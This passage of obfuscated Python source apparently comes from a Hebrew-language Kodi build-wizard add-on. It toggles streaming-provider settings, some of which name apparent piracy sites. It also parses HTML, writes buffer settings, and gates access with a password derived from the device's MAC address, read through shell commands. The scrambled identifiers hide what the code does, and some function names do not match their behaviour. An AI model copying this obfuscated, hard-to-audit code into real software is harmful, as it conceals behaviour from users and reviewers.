		OOO0OO0OOO0000OOO .setSetting ('provider.paczamy','false')#line:1952
		OOO0OO0OOO0000OOO .setSetting ('provider.peliculasdk','false')#line:1953
		OOO0OO0OOO0000OOO .setSetting ('provider.pelisplustv','false')#line:1954
		OOO0OO0OOO0000OOO .setSetting ('provider.pepecine','false')#line:1955
		OOO0OO0OOO0000OOO .setSetting ('provider.primewire','false')#line:1956
		OOO0OO0OOO0000OOO .setSetting ('provider.projectfreetv','false')#line:1957
		OOO0OO0OOO0000OOO .setSetting ('provider.proxer','false')#line:1958
		OOO0OO0OOO0000OOO .setSetting ('provider.pureanime','false')#line:1959
		OOO0OO0OOO0000OOO .setSetting ('provider.putlocker','false')#line:1960
		OOO0OO0OOO0000OOO .setSetting ('provider.putlockerfree','false')#line:1961
		OOO0OO0OOO0000OOO .setSetting ('provider.reddit','false')#line:1962
		OOO0OO0OOO0000OOO .setSetting ('provider.cartoonwire','false')#line:1963
		OOO0OO0OOO0000OOO .setSetting ('provider.seehd','false')#line:1964
		OOO0OO0OOO0000OOO .setSetting ('provider.segos','false')#line:1965
		OOO0OO0OOO0000OOO .setSetting ('provider.serienstream','false')#line:1966
		OOO0OO0OOO0000OOO .setSetting ('provider.series9','false')#line:1967
		OOO0OO0OOO0000OOO .setSetting ('provider.seriesever','false')#line:1968
		OOO0OO0OOO0000OOO .setSetting ('provider.seriesonline','false')#line:1969
		OOO0OO0OOO0000OOO .setSetting ('provider.seriespapaya','false')#line:1970
		OOO0OO0OOO0000OOO .setSetting ('provider.sezonlukdizi','false')#line:1971
		OOO0OO0OOO0000OOO .setSetting ('provider.solarmovie','false')#line:1972
		OOO0OO0OOO0000OOO .setSetting ('provider.solarmoviez','false')#line:1973
		OOO0OO0OOO0000OOO .setSetting ('provider.stream-to','false')#line:1974
		OOO0OO0OOO0000OOO .setSetting ('provider.streamdream','false')#line:1975
		OOO0OO0OOO0000OOO .setSetting ('provider.streamflix','false')#line:1976
		OOO0OO0OOO0000OOO .setSetting ('provider.streamit','false')#line:1977
		OOO0OO0OOO0000OOO .setSetting ('provider.swatchseries','false')#line:1978
		OOO0OO0OOO0000OOO .setSetting ('provider.szukajkatv','false')#line:1979
		OOO0OO0OOO0000OOO .setSetting ('provider.tainiesonline','false')#line:1980
		OOO0OO0OOO0000OOO .setSetting ('provider.tainiomania','false')#line:1981
		OOO0OO0OOO0000OOO .setSetting ('provider.tata','false')#line:1984
		OOO0OO0OOO0000OOO .setSetting ('provider.trt','false')#line:1985
		OOO0OO0OOO0000OOO .setSetting ('provider.tvbox','false')#line:1986
		OOO0OO0OOO0000OOO .setSetting ('provider.ultrahd','false')#line:1987
		OOO0OO0OOO0000OOO .setSetting ('provider.video4k','false')#line:1988
		OOO0OO0OOO0000OOO .setSetting ('provider.vidics','false')#line:1989
		OOO0OO0OOO0000OOO .setSetting ('provider.view4u','false')#line:1990
		OOO0OO0OOO0000OOO .setSetting ('provider.watchseries','false')#line:1991
		OOO0OO0OOO0000OOO .setSetting ('provider.xrysoi','false')#line:1992
		OOO0OO0OOO0000OOO .setSetting ('provider.library','false')#line:1993
def fixfont ():#line:1996
	OO000OOOO0OOO0O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1997
	O00OOOO00OOO0000O =json .loads (OO000OOOO0OOO0O00 );#line:1999
	OO0OOOO0000OOOO0O =O00OOOO00OOO0000O ["result"]["settings"]#line:2000
	O0OOOOOOO000OOO00 =[OOOO00OOOOO0O0O00 for OOOO00OOOOO0O0O00 in OO0OOOO0000OOOO0O if OOOO00OOOOO0O0O00 ["id"]=="audiooutput.audiodevice"][0 ]#line:2002
	O0OO0O0O00OOOOOOO =O0OOOOOOO000OOO00 ["options"];#line:2003
	OOO0O00O0OO0OOO0O =O0OOOOOOO000OOO00 ["value"];#line:2004
	O0000000OO0O0O0OO =[O0OO0O0000O00OO00 for (O0OO0O0000O00OO00 ,OOO00O0O0OOOOO0O0 )in enumerate (O0OO0O0O00OOOOOOO )if OOO00O0O0OOOOO0O0 ["value"]==OOO0O00O0OO0OOO0O ][0 ];#line:2006
	OO00OOO0O0000O0OO =(O0000000OO0O0O0OO +1 )%len (O0OO0O0O00OOOOOOO )#line:2008
	OOO0000OOOO0OO0OO =O0OO0O0O00OOOOOOO [OO00OOO0O0000O0OO ]["value"]#line:2010
	OO00000OO0OO0OOO0 =O0OO0O0O00OOOOOOO [OO00OOO0O0000O0OO ]["label"]#line:2011
	O0OOOO0OO0OOO0O0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2013
	try :#line:2015
		O0OOO0OO0OOOOOO0O =json .loads (O0OOOO0OO0OOO0O0O );#line:2016
		if O0OOO0OO0OOOOOO0O ["result"]!=True :#line:2018
			raise Exception #line:2019
	except :#line:2020
		sys .stderr .write ("Error switching audio output device")#line:2021
		raise Exception #line:2022
def parseDOM2 (OOOO000OOOOO000OO ,name =u"",attrs ={},ret =False ):#line:2023
	if isinstance (OOOO000OOOOO000OO ,str ):#line:2026
		try :#line:2027
			OOOO000OOOOO000OO =[OOOO000OOOOO000OO .decode ("utf-8")]#line:2028
		except :#line:2029
			OOOO000OOOOO000OO =[OOOO000OOOOO000OO ]#line:2030
	elif isinstance (OOOO000OOOOO000OO ,unicode ):#line:2031
		OOOO000OOOOO000OO =[OOOO000OOOOO000OO ]#line:2032
	elif not isinstance (OOOO000OOOOO000OO ,list ):#line:2033
		return u""#line:2034
	if not name .strip ():#line:2036
		return u""#line:2037
	OO000OO0OO0O0OOO0 =[]#line:2039
	for O0000OOOOO00O000O in OOOO000OOOOO000OO :#line:2040
		OOO000OOOOO0O00OO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0000OOOOO00O000O )#line:2041
		for O00OO0000OOOO0OOO in OOO000OOOOO0O00OO :#line:2042
			O0000OOOOO00O000O =O0000OOOOO00O000O .replace (O00OO0000OOOO0OOO ,O00OO0000OOOO0OOO .replace ("\n"," "))#line:2043
		O0O0O0OOO0OO0O00O =[]#line:2045
		for OO0O0OO0O0000O0O0 in attrs :#line:2046
			OO00O0OOO00O00O0O =re .compile ('(<'+name +'[^>]*?(?:'+OO0O0OO0O0000O0O0 +'=[\'"]'+attrs [OO0O0OO0O0000O0O0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0000OOOOO00O000O )#line:2047
			if len (OO00O0OOO00O00O0O )==0 and attrs [OO0O0OO0O0000O0O0 ].find (" ")==-1 :#line:2048
				OO00O0OOO00O00O0O =re .compile ('(<'+name +'[^>]*?(?:'+OO0O0OO0O0000O0O0 +'='+attrs [OO0O0OO0O0000O0O0 ]+'.*?>))',re .M |re .S ).findall (O0000OOOOO00O000O )#line:2049
			if len (O0O0O0OOO0OO0O00O )==0 :#line:2051
				O0O0O0OOO0OO0O00O =OO00O0OOO00O00O0O #line:2052
				OO00O0OOO00O00O0O =[]#line:2053
			else :#line:2054
				O00O000O000O0OO0O =range (len (O0O0O0OOO0OO0O00O ))#line:2055
				O00O000O000O0OO0O .reverse ()#line:2056
				for OO0OOOO00O0OOO0O0 in O00O000O000O0OO0O :#line:2057
					if not O0O0O0OOO0OO0O00O [OO0OOOO00O0OOO0O0 ]in OO00O0OOO00O00O0O :#line:2058
						del (O0O0O0OOO0OO0O00O [OO0OOOO00O0OOO0O0 ])#line:2059
		if len (O0O0O0OOO0OO0O00O )==0 and attrs =={}:#line:2061
			O0O0O0OOO0OO0O00O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0000OOOOO00O000O )#line:2062
			if len (O0O0O0OOO0OO0O00O )==0 :#line:2063
				O0O0O0OOO0OO0O00O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0000OOOOO00O000O )#line:2064
		if isinstance (ret ,str ):#line:2066
			OO00O0OOO00O00O0O =[]#line:2067
			for O00OO0000OOOO0OOO in O0O0O0OOO0OO0O00O :#line:2068
				O0OOO00O00O0O0O0O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O00OO0000OOOO0OOO )#line:2069
				if len (O0OOO00O00O0O0O0O )==0 :#line:2070
					O0OOO00O00O0O0O0O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O00OO0000OOOO0OOO )#line:2071
				for O00OO0O0O000O0O00 in O0OOO00O00O0O0O0O :#line:2072
					O00O0O00O0O0OO0OO =O00OO0O0O000O0O00 [0 ]#line:2073
					if O00O0O00O0O0OO0OO in "'\"":#line:2074
						if O00OO0O0O000O0O00 .find ('='+O00O0O00O0O0OO0OO ,O00OO0O0O000O0O00 .find (O00O0O00O0O0OO0OO ,1 ))>-1 :#line:2075
							O00OO0O0O000O0O00 =O00OO0O0O000O0O00 [:O00OO0O0O000O0O00 .find ('='+O00O0O00O0O0OO0OO ,O00OO0O0O000O0O00 .find (O00O0O00O0O0OO0OO ,1 ))]#line:2076
						if O00OO0O0O000O0O00 .rfind (O00O0O00O0O0OO0OO ,1 )>-1 :#line:2078
							O00OO0O0O000O0O00 =O00OO0O0O000O0O00 [1 :O00OO0O0O000O0O00 .rfind (O00O0O00O0O0OO0OO )]#line:2079
					else :#line:2080
						if O00OO0O0O000O0O00 .find (" ")>0 :#line:2081
							O00OO0O0O000O0O00 =O00OO0O0O000O0O00 [:O00OO0O0O000O0O00 .find (" ")]#line:2082
						elif O00OO0O0O000O0O00 .find ("/")>0 :#line:2083
							O00OO0O0O000O0O00 =O00OO0O0O000O0O00 [:O00OO0O0O000O0O00 .find ("/")]#line:2084
						elif O00OO0O0O000O0O00 .find (">")>0 :#line:2085
							O00OO0O0O000O0O00 =O00OO0O0O000O0O00 [:O00OO0O0O000O0O00 .find (">")]#line:2086
					OO00O0OOO00O00O0O .append (O00OO0O0O000O0O00 .strip ())#line:2088
			O0O0O0OOO0OO0O00O =OO00O0OOO00O00O0O #line:2089
		else :#line:2090
			OO00O0OOO00O00O0O =[]#line:2091
			for O00OO0000OOOO0OOO in O0O0O0OOO0OO0O00O :#line:2092
				OOOO0OOOOO00OOO00 =u"</"+name #line:2093
				O00000OO0O000OOO0 =O0000OOOOO00O000O .find (O00OO0000OOOO0OOO )#line:2095
				OO0O0O0OO0OO0OOO0 =O0000OOOOO00O000O .find (OOOO0OOOOO00OOO00 ,O00000OO0O000OOO0 )#line:2096
				O000O0O0O0O00OO00 =O0000OOOOO00O000O .find ("<"+name ,O00000OO0O000OOO0 +1 )#line:2097
				while O000O0O0O0O00OO00 <OO0O0O0OO0OO0OOO0 and O000O0O0O0O00OO00 !=-1 :#line:2099
					OOO0O0000O0O0O00O =O0000OOOOO00O000O .find (OOOO0OOOOO00OOO00 ,OO0O0O0OO0OO0OOO0 +len (OOOO0OOOOO00OOO00 ))#line:2100
					if OOO0O0000O0O0O00O !=-1 :#line:2101
						OO0O0O0OO0OO0OOO0 =OOO0O0000O0O0O00O #line:2102
					O000O0O0O0O00OO00 =O0000OOOOO00O000O .find ("<"+name ,O000O0O0O0O00OO00 +1 )#line:2103
				if O00000OO0O000OOO0 ==-1 and OO0O0O0OO0OO0OOO0 ==-1 :#line:2105
					OO00000O0OO0O0OOO =u""#line:2106
				elif O00000OO0O000OOO0 >-1 and OO0O0O0OO0OO0OOO0 >-1 :#line:2107
					OO00000O0OO0O0OOO =O0000OOOOO00O000O [O00000OO0O000OOO0 +len (O00OO0000OOOO0OOO ):OO0O0O0OO0OO0OOO0 ]#line:2108
				elif OO0O0O0OO0OO0OOO0 >-1 :#line:2109
					OO00000O0OO0O0OOO =O0000OOOOO00O000O [:OO0O0O0OO0OO0OOO0 ]#line:2110
				elif O00000OO0O000OOO0 >-1 :#line:2111
					OO00000O0OO0O0OOO =O0000OOOOO00O000O [O00000OO0O000OOO0 +len (O00OO0000OOOO0OOO ):]#line:2112
				if ret :#line:2114
					OOOO0OOOOO00OOO00 =O0000OOOOO00O000O [OO0O0O0OO0OO0OOO0 :O0000OOOOO00O000O .find (">",O0000OOOOO00O000O .find (OOOO0OOOOO00OOO00 ))+1 ]#line:2115
					OO00000O0OO0O0OOO =O00OO0000OOOO0OOO +OO00000O0OO0O0OOO +OOOO0OOOOO00OOO00 #line:2116
				O0000OOOOO00O000O =O0000OOOOO00O000O [O0000OOOOO00O000O .find (OO00000O0OO0O0OOO ,O0000OOOOO00O000O .find (O00OO0000OOOO0OOO ))+len (OO00000O0OO0O0OOO ):]#line:2118
				OO00O0OOO00O00O0O .append (OO00000O0OO0O0OOO )#line:2119
			O0O0O0OOO0OO0O00O =OO00O0OOO00O00O0O #line:2120
		OO000OO0OO0O0OOO0 +=O0O0O0OOO0OO0O00O #line:2121
	return OO000OO0OO0O0OOO0 #line:2123
def addItem (O00OO0OOOO0OOO00O ,O0O00OOO00O0O0OO0 ,OOO00OOOO0OO0OO0O ,OOO000OO000OOO00O ,OOO0O0000O00OOO0O ,description =None ):#line:2125
	if description ==None :description =''#line:2126
	description ='[COLOR white]'+description +'[/COLOR]'#line:2127
	O0000OO00O000OO00 =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O00OOO00O0O0OO0 )+"&mode="+str (OOO00OOOO0OO0OO0O )+"&name="+urllib .quote_plus (O00OO0OOOO0OOO00O )+"&iconimage="+urllib .quote_plus (OOO000OO000OOO00O )+"&fanart="+urllib .quote_plus (OOO0O0000O00OOO0O )#line:2128
	OOOO000OO0O0OO0O0 =True #line:2129
	O0O000000000OO0O0 =xbmcgui .ListItem (O00OO0OOOO0OOO00O ,iconImage =OOO000OO000OOO00O ,thumbnailImage =OOO000OO000OOO00O )#line:2130
	O0O000000000OO0O0 .setInfo (type ="Video",infoLabels ={"Title":O00OO0OOOO0OOO00O ,"Plot":description })#line:2131
	O0O000000000OO0O0 .setProperty ("fanart_Image",OOO0O0000O00OOO0O )#line:2132
	O0O000000000OO0O0 .setProperty ("icon_Image",OOO000OO000OOO00O )#line:2133
	OOOO000OO0O0OO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0000OO00O000OO00 ,listitem =O0O000000000OO0O0 ,isFolder =False )#line:2134
	return OOOO000OO0O0OO0O0 #line:2135
def get_params ():#line:2137
		OO000OOOO00O0O0OO =[]#line:2138
		O0OOO0OO000OOO0O0 =sys .argv [2 ]#line:2139
		if len (O0OOO0OO000OOO0O0 )>=2 :#line:2140
				OOOOO0OOOO0O00O00 =sys .argv [2 ]#line:2141
				O0O0OO0O00O0O000O =OOOOO0OOOO0O00O00 .replace ('?','')#line:2142
				if (OOOOO0OOOO0O00O00 [len (OOOOO0OOOO0O00O00 )-1 ]=='/'):#line:2143
						OOOOO0OOOO0O00O00 =OOOOO0OOOO0O00O00 [0 :len (OOOOO0OOOO0O00O00 )-2 ]#line:2144
				OOOO00OOOO00O0OO0 =O0O0OO0O00O0O000O .split ('&')#line:2145
				OO000OOOO00O0O0OO ={}#line:2146
				for OO00O00OO0O0O00OO in range (len (OOOO00OOOO00O0OO0 )):#line:2147
						O0OOO000OOOOO00O0 ={}#line:2148
						O0OOO000OOOOO00O0 =OOOO00OOOO00O0OO0 [OO00O00OO0O0O00OO ].split ('=')#line:2149
						if (len (O0OOO000OOOOO00O0 ))==2 :#line:2150
								OO000OOOO00O0O0OO [O0OOO000OOOOO00O0 [0 ]]=O0OOO000OOOOO00O0 [1 ]#line:2151
		return OO000OOOO00O0O0OO #line:2153
def decode (OO0OOOO0000O0OOOO ,OOO0O000O0O000000 ):#line:2158
    import base64 #line:2159
    OO0000OOOOO0O0O00 =[]#line:2160
    if (len (OO0OOOO0000O0OOOO ))!=4 :#line:2162
     return 10 #line:2163
    OOO0O000O0O000000 =base64 .urlsafe_b64decode (OOO0O000O0O000000 )#line:2164
    for O00O00O00O00000OO in range (len (OOO0O000O0O000000 )):#line:2166
        O00O00OO0000OOO00 =OO0OOOO0000O0OOOO [O00O00O00O00000OO %len (OO0OOOO0000O0OOOO )]#line:2167
        OOO0000O00OOOO000 =chr ((256 +ord (OOO0O000O0O000000 [O00O00O00O00000OO ])-ord (O00O00OO0000OOO00 ))%256 )#line:2168
        OO0000OOOOO0O0O00 .append (OOO0000O00OOOO000 )#line:2169
    return "".join (OO0000OOOOO0O0O00 )#line:2170
def tmdb_list (OOOOO0OO00OO00000 ):#line:2171
    O0O00O0O0OO0O0OO0 =decode ("7643",OOOOO0OO00OO00000 )#line:2174
    return int (O0O00O0O0OO0O0OO0 )#line:2177
def u_list (OO00O00OO00O00O00 ):#line:2178
   try :#line:2179
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2180
        from math import sqrt #line:2181
        O00OO0O0OO0O0O0O0 =tmdb_list (TMDB_NEW_API )#line:2182
        OO0O0O00OO0OO000O =str ((getHwAddr ('eth0'))*O00OO0O0OO0O0O0O0 )#line:2184
        OO0OO0O00OO00O00O =int (OO0O0O00OO0OO000O [1 ]+OO0O0O00OO0OO000O [2 ]+OO0O0O00OO0OO000O [5 ]+OO0O0O00OO0OO000O [7 ])#line:2185
        OOO0O0000O0000O0O =(ADDON .getSetting ("pass"))#line:2187
        OOO000O0OO000O00O =(str (round (sqrt ((OO0OO0O00OO00O00O *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2192
        if '.'in OOO000O0OO000O00O :#line:2194
         OOO000O0OO000O00O =(str (round (sqrt ((OO0OO0O00OO00O00O *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2195
        if OOO0O0000O0000O0O ==OOO000O0OO000O00O :#line:2197
          OOOOO0OOOO0OO00OO =OO00O00OO00O00O00 #line:2199
        else :#line:2201
           if STARTP2 ()and STARTP ()=='ok':#line:2202
             return OO00O00OO00O00O00 #line:2205
           OOOOO0OOOO0OO00OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2206
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2207
           sys .exit ()#line:2208
        return OOOOO0OOOO0OO00OO #line:2209
    else :#line:2210
        STARTP ()#line:2211
   except :#line:2213
           if STARTP2 ()and STARTP ()=='ok':#line:2214
             return OO00O00OO00O00O00 #line:2217
           OOOOO0OOOO0OO00OO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2218
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2219
           sys .exit ()#line:2220
def disply_hwr ():#line:2223
   try :#line:2224
    OOO0OO00OOOOOO0OO =tmdb_list (TMDB_NEW_API )#line:2225
    OO00OOO000000OOOO =str ((getHwAddr ('eth0'))*OOO0OO00OOOOOO0OO )#line:2226
    OOOO0O0000O000000 =(OO00OOO000000OOOO [1 ]+OO00OOO000000OOOO [2 ]+OO00OOO000000OOOO [5 ]+OO00OOO000000OOOO [7 ])#line:2233
    OOO00O0OO0O0O0O00 =(ADDON .getSetting ("action"))#line:2234
    wiz .setS ('action',str (OOOO0O0000O000000 ))#line:2236
   except :pass #line:2237
def disply_hwr2 ():#line:2238
   try :#line:2239
    O0000OOOO0O0OOO00 =tmdb_list (TMDB_NEW_API )#line:2240
    O0O0OOO00000OOOOO =str ((getHwAddr ('eth0'))*O0000OOOO0O0OOO00 )#line:2242
    O0OOO0000OO000O00 =(O0O0OOO00000OOOOO [1 ]+O0O0OOO00000OOOOO [2 ]+O0O0OOO00000OOOOO [5 ]+O0O0OOO00000OOOOO [7 ])#line:2251
    O00O00O0O000O00O0 =(ADDON .getSetting ("action"))#line:2252
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0OOO0000OO000O00 )#line:2255
   except :pass #line:2256
def getHwAddr (OOOOOOOO0OO0000O0 ):#line:2258
   import subprocess ,time #line:2259
   OO0000OO00O0000OO ='windows'#line:2260
   if xbmc .getCondVisibility ('system.platform.android'):#line:2261
       OO0000OO00O0000OO ='android'#line:2262
   if xbmc .getCondVisibility ('system.platform.android'):#line:2263
     O00OOO0OOOO0OOOO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2264
     O000O000OOOO000O0 =re .compile ('link/ether (.+?) brd').findall (str (O00OOO0OOOO0OOOO0 ))#line:2266
     OO000OOO000O0OOO0 =0 #line:2267
     for OOO00O0O0OOOO000O in O000O000OOOO000O0 :#line:2268
      if O000O000OOOO000O0 !='00:00:00:00:00:00':#line:2269
          OO00O00OOO0O0000O =OOO00O0O0OOOO000O #line:2270
          OO000OOO000O0OOO0 =OO000OOO000O0OOO0 +int (OO00O00OOO0O0000O .replace (':',''),16 )#line:2271
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2273
       O0OO000OOOOOOO0OO =0 #line:2274
       OO000OOO000O0OOO0 =0 #line:2275
       O00O0O00OO000000O =[]#line:2276
       OO000O0O0OO00000O =os .popen ("getmac").read ()#line:2277
       OO000O0O0OO00000O =OO000O0O0OO00000O .split ("\n")#line:2278
       for OOOOO000OO000OO00 in OO000O0O0OO00000O :#line:2280
            O0O0OOOOO0O0O0O0O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOOO000OO000OO00 ,re .I )#line:2281
            if O0O0OOOOO0O0O0O0O :#line:2282
                O000O000OOOO000O0 =O0O0OOOOO0O0O0O0O .group ().replace ('-',':')#line:2283
                O00O0O00OO000000O .append (O000O000OOOO000O0 )#line:2284
                OO000OOO000O0OOO0 =OO000OOO000O0OOO0 +int (O000O000OOOO000O0 .replace (':',''),16 )#line:2287
   else :#line:2289
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2290
   try :#line:2307
    return OO000OOO000O0OOO0 #line:2308
   except :pass #line:2309
def getpass ():#line:2310
	disply_hwr2 ()#line:2312
def setpass ():#line:2313
    O0O0OOO0000O0OO0O =xbmcgui .Dialog ()#line:2314
    OOOOO000O0O0OOOO0 =''#line:2315
    O0OO0O0OO0O0000O0 =xbmc .Keyboard (OOOOO000O0O0OOOO0 ,'הכנס סיסמה')#line:2317
    O0OO0O0OO0O0000O0 .doModal ()#line:2318
    if O0OO0O0OO0O0000O0 .isConfirmed ():#line:2319
           O0OO0O0OO0O0000O0 =O0OO0O0OO0O0000O0 .getText ()#line:2320
    wiz .setS ('pass',str (O0OO0O0OO0O0000O0 ))#line:2321
def setuname ():#line:2322
    OOO0O00OOO0OO00O0 =''#line:2323
    OO0OOO00OOO0O00O0 =xbmc .Keyboard (OOO0O00OOO0OO00O0 ,'הכנס שם משתמש')#line:2324
    OO0OOO00OOO0O00O0 .doModal ()#line:2325
    if OO0OOO00OOO0O00O0 .isConfirmed ():#line:2326
           OOO0O00OOO0OO00O0 =OO0OOO00OOO0O00O0 .getText ()#line:2327
           wiz .setS ('user',str (OOO0O00OOO0OO00O0 ))#line:2328
def powerkodi ():#line:2329
    os ._exit (1 )#line:2330
def buffer1 ():#line:2332
	O000O0O0OO000OO00 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2333
	OO0O00000OO0000O0 =xbmc .getInfoLabel ("System.Memory(total)")#line:2334
	OO0OOOO0OOOOOO0OO =xbmc .getInfoLabel ("System.FreeMemory")#line:2335
	OOOO0OOOO000OO0O0 =re .sub ('[^0-9]','',OO0OOOO0OOOOOO0OO )#line:2336
	OOOO0OOOO000OO0O0 =int (OOOO0OOOO000OO0O0 )/3 #line:2337
	O0OOOO0OOO0O0000O =OOOO0OOOO000OO0O0 *1024 *1024 #line:2338
	try :O000OO0OO0O0O0O00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2339
	except :O000OO0OO0O0O0O00 =16 #line:2340
	OO000O0O0O0OO000O =DIALOG .yesno ('FREE MEMORY: '+str (OO0OOOO0OOOOOO0OO ),'Based on your free Memory your optimal buffersize is: '+str (OOOO0OOOO000OO0O0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2343
	if OO000O0O0O0OO000O ==1 :#line:2344
		with open (O000O0O0OO000OO00 ,"w")as OO000OOOO000OO00O :#line:2345
			if O000OO0OO0O0O0O00 >=17 :OO00O00O0O0OOOO0O =xml_data_advSettings_New (str (O0OOOO0OOO0O0000O ))#line:2346
			else :OO00O00O0O0OOOO0O =xml_data_advSettings_old (str (O0OOOO0OOO0O0000O ))#line:2347
			OO000OOOO000OO00O .write (OO00O00O0O0OOOO0O )#line:2349
			DIALOG .ok ('Buffer Size Set to: '+str (O0OOOO0OOO0O0000O ),'Please restart Kodi for settings to apply.','')#line:2350
	elif OO000O0O0O0OO000O ==0 :#line:2352
		O0OOOO0OOO0O0000O =_OO0OOO0O00OO00000 (default =str (O0OOOO0OOO0O0000O ),heading ="INPUT BUFFER SIZE")#line:2353
		with open (O000O0O0OO000OO00 ,"w")as OO000OOOO000OO00O :#line:2354
			if O000OO0OO0O0O0O00 >=17 :OO00O00O0O0OOOO0O =xml_data_advSettings_New (str (O0OOOO0OOO0O0000O ))#line:2355
			else :OO00O00O0O0OOOO0O =xml_data_advSettings_old (str (O0OOOO0OOO0O0000O ))#line:2356
			OO000OOOO000OO00O .write (OO00O00O0O0OOOO0O )#line:2357
			DIALOG .ok ('Buffer Size Set to: '+str (O0OOOO0OOO0O0000O ),'Please restart Kodi for settings to apply.','')#line:2358
def xml_data_advSettings_old (OO0O000OO0OO00O0O ):#line:2359
	O000OO0OO0OOO0OO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O000OO0OO00O0O #line:2369
	return O000OO0OO0OOO0OO0 #line:2370
def xml_data_advSettings_New (OO0O00O00O0OO0OOO ):#line:2372
	O0OO000OO0O000O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO0O00O00O0OO0OOO #line:2384
	return O0OO000OO0O000O00 #line:2385
def write_ADV_SETTINGS_XML (OO0O0O0O0O0OO0O0O ):#line:2386
    if not os .path .exists (xml_file ):#line:2387
        with open (xml_file ,"w")as O0OO0O0O00OOO0O00 :#line:2388
            O0OO0O0O00OOO0O00 .write (xml_data )#line:2389
def _OO0OOO0O00OO00000 (default ="",heading ="",hidden =False ):#line:2390
    ""#line:2391
    O00OOO0O000OO0OO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2392
    O00OOO0O000OO0OO0 .doModal ()#line:2393
    if (O00OOO0O000OO0OO0 .isConfirmed ()):#line:2394
        return unicode (O00OOO0O000OO0OO0 .getText (),"utf-8")#line:2395
    return default #line:2396
def index ():#line:2398
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2399
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2400
	if AUTOUPDATE =='Yes':#line:2401
		if wiz .workingURL (WIZARDFILE )==True :#line:2402
			O0OOO0O00O00O0O0O =wiz .checkWizard ('version')#line:2403
			if O0OOO0O00O00O0O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OOO0O00O00O0O0O ),'wizardupdate',themeit =THEME2 )#line:2404
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2405
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2406
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2407
	if len (BUILDNAME )>0 :#line:2408
		O0O0OOO000OO0OOO0 =wiz .checkBuild (BUILDNAME ,'version')#line:2409
		O0OO0O00000OO0OO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2410
		if O0O0OOO000OO0OOO0 >BUILDVERSION :O0OO0O00000OO0OO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0OO0O00000OO0OO0 ,O0O0OOO000OO0OOO0 )#line:2411
		addDir (O0OO0O00000OO0OO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2413
		try :#line:2415
		     O0000O0OO000O0OOO =wiz .themeCount (BUILDNAME )#line:2416
		except :#line:2417
		   O0000O0OO000O0OOO =False #line:2418
		if not O0000O0OO000O0OOO ==False :#line:2419
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2420
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2421
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2424
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2425
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2426
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2430
